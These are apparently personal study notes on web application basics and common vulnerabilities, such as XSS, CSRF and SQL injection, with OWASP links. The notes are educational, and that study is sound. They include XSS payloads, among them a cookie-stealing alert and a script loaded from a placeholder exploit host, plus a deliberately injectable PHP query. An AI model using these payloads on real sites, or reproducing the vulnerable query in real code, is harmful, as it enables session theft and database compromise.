
## Table of Contents

* [Overview](#overview)
* [CMS](#cms)
* [Testing Guide](#testing-guide)
* [Web Applicaation Layout Category](#web-applicaation-layout-category)
    * [Web Application Infrastructure](#web-application-infrastructure) 
    * [Web Application Components](#web-application-components)
    * [Web Application Architecture](#web-application-architecture)
    * [Microservices](#microservices)
    * [Serverless](#serverless)
* [Fron End vs Back End]()
    * [Front End](#front-end)
    * [Back End](#back-end)
    * [Securing Front & Back End - OWASP Top 10](#securing-front--back-end)
* Frond End Components    
    * [URL Encoding](#url-encoding)
        * [Tools](#tools-)
    * [Document Object Model](#document-object-model-dom)
    * [Cascading Style Sheets (CSS)](#cascading-style-sheets-css)
    * [Javascript](#javascript)
* Front End Vulnerabilities
    * [Sensitive Data Exposure](#sensitive-data-exposure)
    * [HTML Injection](#html-injection)
    * [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
    * [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
    * [PRevention](#prevention)
* Back End Components
    * [Web Servers](#web-servers)
        * [Workflow](#workflow)
        * [HTTP Response Codes](#http-response-codes)
* [Databases](#databases)
    * [Relation(SQL)](#relationsql)
    * [Non-Relational (NoSQL)](#non-relational-nosql)
    * [Use in web Application](#use-in-web-applications)
* [Development Frameworks & API](#development-frameworks--api)
    * [APIs](#application-programming-interface-apis)
    * [Query Parameters](#query-parameters)
    * [Web APIs](#web-apis)
        * [Simple Object Access (SOAP)](#simple-object-access-soap)
        * [Representational State Transfer (REST)](#representational-state-transfer-rest)
* Common Web Vulnerabilities
    * [Broken Authentication / Access Control](#broken-authentication--access-control)
    * [Malicious File Upload](#malicious-file-upload)
    * [Command Injection](#command-injection)
    * [SQL Injection (SQLi)](#sql-injection)
* [Pulic CVE](#public-cve)    
* [Vulnerability Scoring System](#vulnerability-scoring-system)

# Overview
* Website (Web 1.0) vs Native OS Applications vs Web Applications (Web 2.0) [DApps = Web 3.0]


# CMS
* Open-Source = WordPress , OpenCart, Joomla, etc.
* Closed-Source = Wix, Shopify, DotNetNuke, etc.


# Testing Guide
[OWASP Web Application Security Testing Guide](https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing)

Testing Methodology:
1. Front End Components (HTML, CSS, Javascript)
2. Application Flow
    - Authenticated
    - Un-Authenticated

> * Note: SQLi often found in applications using AD for authentication.


# Web Applicaation Layout Category

## Web Application Infrastructure 
* Setups / Models
    * Client - Server
    * One Server
    * Many Servers - One Database
    * Many Servers - Many Databases
    * [Serverless](https://aws.amazon.com/lambda/serverless-architectures-learn-more/)
    * [Microservices](https://aws.amazon.com/microservices/)

## Web Application Components
1. Clients [Browser, Mobile Apps, etc.]
2. Server
    * WebServer [Nginx, Apache HTTP Server, MS IIS, LiteSpeed, etc.]
    * Web Application Logic [Application Server - Apache Tomcat, IBM WebSphere, JBoss, IIS, GlassFish, WebLogic, etc.]
    * Database
3. Services (Microservices)
    * 3rd Party Integrations [Payment Processing = Stripe, PayPal] [CRM & Marketing = Salesforce, HubSpot] [E-Commerce and Analytics = Google Analytics, Shopify]
    * Web Application Integrations [Salesforce CRM, Zendesk, Workday, etc.]
4. Functions (Serverless) [AWS Lambda, Azure Functions, OpenFaaS, etc.]

## Web Application Architecture
1. Presentation Layer = Consists of UI process components that enable communication with the application and the system. These can be accessed by the client via the web browser and are returned in the form of HTML, JavaScript, and CSS.
2. Application Layer = This layer ensures that all client requests (web requests) are correctly processed. Various criteria are checked, such as authorization, privileges, and data passed on to the client.
3. Data Layer = The data layer works closely with the application layer to determine exactly where the required data is stored and can be accessed.

References
* https://learn.microsoft.com/en-us/dotnet/architecture/modern-web-apps-azure/common-web-application-architectures

> * Note: Some web servers can run operating system calls and programs, like IIS ISAPI or PHP-CGI.

## Microservices
* Stateless [request and response are independent]
* Data stored seperately
* Service-Oriented Architecture (SOA)
* Can be written in different programming languages and still interact.

## Serverless
* Run in stateless computing containers (like Docker)
* Flexibility to build and deploy applications and services without having to manage infrastructure
* Server management is done by the cloud provider


# Front End vs Back End 
* Full Stack = Front + Back End

## Front End
* Front End = HTML, CSS, JS
> Playground
> * [HTML-CSS-JS](https://html-css-js.com/)
> * [HTML6 Editor](https://html6.com/editor/)

## Back End
* May never see or directly interact with
* The back end server would fit in the [Data access layer](https://en.wikipedia.org/wiki/Data_access_layer).
* Other components = Hypervisors, Containers and WAFs

|Component|Description|
|--|--|
|Back End Servers|The hardware and operating system that hosts all other components and are usually run on operating systems like Linux, Windows, or using Containers.|
|Web Servers|Web servers handle HTTP requests and connections. Some examples are Apache, NGINX, and IIS.|
|Databases|Databases (DBs) store and retrieve the web application data. Some examples of relational databases are MySQL, MSSQL, Oracle, PostgreSQL, while examples of non-relational databases include NoSQL and MongoDB.|
Development Frameworks|Development Frameworks are used to develop the core Web Application. Some well-known frameworks include Laravel (PHP), ASP.NET (C#), Spring (Java), Django (Python), and Express (NodeJS JavaScript).|

* Some of the main jobs performed by back end components include:
    * Develop the main logic and services of the back end of the web application
    * Develop the main code and functionalities of the web application
    * Develop and maintain the back end database
    * Develop and implement libraries to be used by the web application
    * Implement technical/business needs for the web application
    * Implement the main APIs for front end component communications
    * Integrate remote servers and cloud services into the web application

* [Popular combinations of "stacks" for back-end servers](https://en.wikipedia.org/wiki/Solution_stack)
    * [LAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle)) = Linux, Apache, MySQL & PHP
    * [WAMP](https://en.wikipedia.org/wiki/LAMP_(software_bundle)#WAMP) = Windows, Apache, MySQL & PHP
    * [WINS](https://en.wikipedia.org/wiki/Solution_stack) = Windows, IIS, .NET & SQL Server
    * [MAMP](https://en.wikipedia.org/wiki/MAMP) = macOS, Apache, MySQL & PHP
    * [XAMPP](https://en.wikipedia.org/wiki/XAMPP) = Cross-Platform, Apache, MySQL & PHP/PERL

## Securing Front & Back End
* [OWASP Top 10](https://owasp.org/www-project-top-ten/)


# URL Encoding 
* Also known as Percent Encoding
> * Note: In URLs, for example, browsers can only use ASCII encoding, which only allows alphanumerical characters and certain special characters.

|Character|Encoding|
|--|--|
|space|	%20|
|!|	%21|
|"|	%22|
|#|	%23|
|$|	%24|
|%|	%25|
|&|	%26|
|'|	%27|
|(|	%28|
|)|	%29|

[HTML URL Encoding Reference](https://www.w3schools.com/tags/ref_urlencode.ASP)

## Tools :
- Burp Encoder & Decoder
- https://www.url-encode-decode.com/


# Document Object Model (DOM)
DOM = Elements = < head> , < body> , < style> , < script>

* Core DOM - the standard model for all document types
* XML DOM - the standard model for XML documents
* HTML DOM - the standard model for HTML documents


# Cascading Style Sheets (CSS)
* Stylesheet language used alongside HTML to format and set the style of HTML elements.
* Syntax 
    ```css
    /* List of css properties = https://www.w3schools.com/cssref/index.php */
    element {property : value;}
    ```
* [CSS Animations](https://www.w3schools.com/css/css3_animations.asp)
* ["Parallax Depth Cards - by Andy Merskin on CodePen"](https://codepen.io/andymerskin/pen/XNMWvQ)
* Common CSS Frameworks
    * [Bootstrap](https://www.w3schools.com/bootstrap4/)
    * [SASS](https://sass-lang.com/)
    * [Foundation](https://en.wikipedia.org/wiki/Foundation_(framework))
    * [Bulma](https://bulma.io/)
    * [Pure](https://pure-css.github.io/)


# Javascript
* Front-end and executed within a browser
* Back-end Javascript, develop entire web applications = NodeJS
* Also used to automate complex process and Perform HTTP request to interact with back end, similar to Ajax.
* Examples
    ```javascript
    <script type="text/javascript"> ..Javascript Code.. </script>
    <script src="./script.js"></script>

    // Javascript code example
    document.getElementById("button1").innerHTML = "Changed Text!";
    ```

> Playground
> * [JSFiddle](https://jsfiddle.net/)

* Common Front end Javascript Framework:
    * [Angular](https://www.w3schools.com/angular/angular_intro.asp)
    * [React](https://www.w3schools.com/react/react_intro.asp)
    * [Vue](https://www.w3schools.com/whatis/whatis_vue.asp)
    * [jQuery](https://www.w3schools.com/jquery/)
* [Comparision of JS Web Frameworks](https://en.wikipedia.org/wiki/Comparison_of_JavaScript-based_web_frameworks)


# [Sensitive Data Exposure](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)
* Front end vulnerability => Exploit admin user => Unauthorized access, Access to sensitive data, service disruption, etc.
* Usually found in :
    * Source code of web page {Right Click -> View Page Source or Ctrl + U or `view-source:https://xxx.com` }
    * External Javascript code
> * Note:  Front end developers may want to use JavaScript code packing or obfuscation to reduce the chances of exposing sensitive data through JavaScript code.


# [HTML Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection)
* Validate and sanitize user input on both the front end and the back end
* Occurs when unfiltered user input is displayed on the page.
* Injected html executed on client-side
* Attacks:
    * Web page Defacing
    * Capture Login Credentials / Cookies
    * URL Redirection to malicious domain
* Attack Payload
    ```html
    <style> body { background-image: url('https://academy.hackthebox.com/images/logo.svg'); } </style>
    <a href="http://www.hackthebox.com">Click Me</a>
    ```
> * Note: As everything is being carried out on the front end, refreshing the web page would reset everything back to normal.


# [Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
* Injected javascript executed on client-side.
* Types of XSS
    |Type|Description|
    |--|--|
    |Self|Self-XSS attack, the victim of the attack runs malicious code in their own web browser, thus exposing personal information to the attacker (Social engineering Attack)|
    |Reflected|Occurs when user input is displayed on the page after processing (e.g., search result or error message)|
    |Stored|Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments)|
    |DOM|Occurs when user input is directly shown in the browser and is written to an HTML DOM object (e.g., vulnerable username or page title).No request & response observed. Affects DOM of the browser|
* Attack Payloads
    ```javascript
    <script>alert(1)</script>
    #"><img src=/ onerror=alert(document.cookie)>
    "><script src=//www.example.com/exploit.js></script>
    ```


# [Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)
* Pre-requisites :
    * XSS vulnerabilities to perform certain queries.
    * API calls on a web application that the victim is currently authenticated to
    * User should be logged into the application and the link should be opened in same browser. Uses user's logged-in session cookie for exploitation.
* Example : Craft a Javascript pasyload that aiutomatically changes the victim's password


# Prevention
|Type|Description|
|--|--|
|Sanitization|Removing special characters and non-standard characters from user input before displaying it or storing it|
|Validation|Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)|
* Implement Web Application Firewall (WAF)
* Additional layer of protection:
    * XSS = Implement Content Security Policy (CSP)
    * CSRF = Anti-CSRF Tokens & SameSite=Strict or Lax Cookie Attribute
* [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)    
* [CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#cross-site-request-forgery-prevention-cheat-sheet)
* [Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)


# Web Servers
* Handles all HTTP traffic
* TCP Port 80 (http) or 443 (https)
* Common Web Server Solutions :
    * [Apache](https://www.apache.org/) = PHP, .NET, Python, Perl & Bash through CGI
    * [Nginx](https://www.f5.com/products/nginx#overview) = Javascript
    * [IIS](https://en.wikipedia.org/wiki/Internet_Information_Services) = .NET
    * [Apache Tomcat](https://tomcat.apache.org/) = Java
    * [NodeJS](https://nodejs.org/en/) = Javascript

## Workflow
Web Servers <-> Client (Mobile, Laptop, Computer or Tabs)

## HTTP Response Codes
|Code|Description|
|--|--|
|Successful Response|
|200 OK|The request has succeded|
|Redirection Messages|
|301 Moved Permanently|The URL of the requested resource has been changed permanently|
|302 Found|The URL of the requested resource has been changed temporarily|
|Client Error Responses|
|400 Bad Request|The server could not understand the request due to invalid syntax|
|401 Unauthorized|Unauthenticated attempt to access page|
|403 Forbidden|The client does not have access rights to the content|
|404 Not Found|The server can not find the requested resource|
|405 Method Not Allowed|The request method is known by the server but has been disabled and cannot be used|
|408 Request Timeout|This response is sent on an idle connection by some servers, even without any previous request by the client|
|Server Error Responses|
|501 Internal Server Error|The server has encountered a situation it doesn't know how to handle|
|502 Bad Gateway|The server, while working as a gateway to get a response needed to handle the request, received an invalid response|
|504 Gateway Timeout|The server is acting as a gateway and cannot get a response in time|


# [Databases](https://en.wikipedia.org/wiki/Database)
* Speed = Size = Scalaability = Cost

## [Relation(SQL)](https://en.wikipedia.org/wiki/Relational_database)
* Store their data in tables, rows, and columns
* Each table can have unique keys, which can link tables together and create relationships between tables. {Primary vs Secondary Keys}
> * Note: The relationship between tables within a database is called a Schema.

* Common RDBMS:

    |Type|Description|
    |--|--|
    |MySQL|The most commonly used database around the internet. It is an open-source database and can be used completely free of charge
    |MSSQL|Microsoft's implementation of a relational database. Widely used with Windows Servers and IIS web servers|
    |Oracle|A very reliable database for big businesses, and is frequently updated with innovative database solutions to make it faster and more reliable. It can be costly, even for big businesses|
    |PostgreSQL|Another free and open-source relational database. It is designed to be easily extensible, enabling adding advanced new features without needing a major change to the initial database design|

* Other common SQL databases include: SQLite, MariaDB, Amazon Aurora, and Azure SQL.

## [Non-Relational (NoSQL)](https://en.wikipedia.org/wiki/NoSQL)
* Stores data using various storage models, depending on the type of data stored
* Common storage models:
    * Key_Value (Data is saved as a collection of unique keys and paired values, acting like a giant hash table or dictionary.)
    * Document-Based (Data is stored in flexible, semi-structured formats like JSON, BSON, or XML rather than rigid tables.)
    * Wide-Column (Data is organized into rows and dynamic columns grouped into column families instead of standard rows.)
    * Graph (Data is represented as nodes (entities) and edges (relationships) with properties attached to both.)

* Common NoSQL database:
|   Type|Description|
    |--|--|
    |MongoDB|The most common NoSQL database. It is free and open-source, uses the Document-Based model, and stores data in JSON objects|
    |ElasticSearch|Another free and open-source NoSQL database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient|
    |Apache Cassandra|Also free and open-source. It is very scalable and is optimized for gracefully handling faulty values|
* Other common NoSQL databases include: Redis, Neo4j, CouchDB, and Amazon DynamoDB

## Use in Web Applications
* Example: PHP web application using MySQL DB
    ```php
    // Connection to the Db server
    $conn = new mysqli("localhost", "user", "pass");

    // Create a new Database
    $sql = "CREATE DATABASE database1";
    $conn->query($sql)

    // Coonect to new DB and start using it
    $conn = new mysqli("localhost", "user", "pass", "database1");
    $query = "select * from table_1";
    $result = $conn->query($query);
    ```

* Example : [SQL injection vulnerability](https://owasp.org/www-community/attacks/SQL_Injection)
    ```php
    // Searching a user
    $searchInput =  $_POST['findUser'];
    $query = "select * from users where name like '%$searchInput%'";
    $result = $conn->query($query);

    //Handling the response
    while($row = $result->fetch_assoc() ){
        echo $row["name"]."<br>";
    }
    ```

# Development Frameworks & API
* Help in developing core web application files and functionality
* Common Web Development Frameworks :
    * [Laravel](https://laravel.com/) (PHP) = Usually used by startups and smaller companies, as it is powerful yet easy to develop for.
    * [Express](https://expressjs.com/) (NodeJS) = Used by PayPal, Yahoo, Uber, IBM, and MySpace.
    * [Django](https://www.djangoproject.com/) (Python) = Used by Google, YouTube, Instagram, Mozilla, and Pinterest.
    * [Rails](https://rubyonrails.org/) (Ruby) = used by GitHub, Hulu, Twitch, Airbnb, and even Twitter in the past.
> * Note: It must be noted that popular websites usually utilize a variety of frameworks and web servers, rather than just one.

## Application Programming Interface (APIs)
* An important aspect of back end web application development is the use of Web APIs and HTTP Request parameters to connect the front end and the back end to be able to send data back and forth between front end and back end components and carry out various functions within the web application.

## Query Parameters
* The front end components to specify values for certain parameters used within the page for the back end components to process them and respond accordingly.

## Web APIs
* An interface within an application that specifies how the application can interact with other applications.
* To enable the use of APIs within a web application, the developers have to develop this functionality on the back end of the web application by using the API standards like `SOAP` or `REST`

### Simple Object Access (SOAP)
* Shares data through XML, where the request & response is done in XML over HTTP
* SOAP is very useful for transferring structured data (i.e., an entire class object), or even binary data, and is often used with serialized objects, all of which enables sharing complex data between front end and back end components and parsing it properly. It is also very useful for sharing stateful objects -i.e., sharing/changing the current state of a web page-, which is becoming more common with modern web applications and mobile applications.
* Example :
    ```xml
    <?xml version="1.0"?>

    <soap:Envelope
    xmlns:soap="http://www.example.com/soap/soap/"
    soap:encodingStyle="http://www.w3.org/soap/soap-encoding">

    <soap:Header>
    </soap:Header>

    <soap:Body>
    <soap:Fault>
    </soap:Fault>
    </soap:Body>

    </soap:Envelope>
    ```

### Representational State Transfer (REST)
* Shares data through the URL path 'i.e. search/users/1', and usually returns the output in JSON format 'i.e. userid 1
* The front end components are then developed to handle JSON format response and render it properly.
* Other output formats for REST include XML, x-www-form-urlencoded, or even raw data.
* REST uses various HTTP methods to perform different actions on the web application:
    * GET request to retrieve data
    * POST request to create data (non-idempotent)
    * PUT request to create or replace existing data (idempotent)
    * DELETE request to remove data


# [Broken Authentication](https://owasp.org/Top10/2025/A07_2025-Authentication_Failures/) / [Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/) 
* Bypass authentication functions
* Access pages and features they should not have access to.


# [Malicious File Upload](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files)
* Uploading malicious scripts


# [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
* Web apps execute local Operating System commands to perform certain processes.


# SQL Injection
* [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)


# Public CVE
* [Common Vulnerabilities & Exposure (CVE)](https://www.cve.org/CVERecord?id=CVE-2014-6271)

> * Tip: The first step is to identify the version of the web application. This can be found in many locations, like the source code of the web application. For open source web applications, we can check the repository of the web application and identify where the version number is shown (e.g,. in (version.php) page), and then check the same page on our target web application to confirm.

* Exploit Databases:
    * [Exploit DB](https://www.exploit-db.com/)
    * [Rapid7 DB](https://www.rapid7.com/db/)
    * [Vulnerability Lab](https://www.vulnerability-lab.com/)

# Vulnerability Scoring System
* [Common Vulnerability Scoring System (CVSS)](https://en.wikipedia.org/wiki/Common_Vulnerability_Scoring_System)
* [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
* [CVSS : User Guide](https://www.first.org/cvss/user-guide)

* [NVD CVSS v3.1 Ratings](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)

    |Severity|Base Score Range|
    |--|--|
    |None|0.0|
    |Low|0.1 - 3.9|
    |Medium|4.0 - 6.9|
    |High|7.0 - 8.9|
    |Critical|9.0 - 10.0|

* [CVE Details](https://www.cvedetails.com/)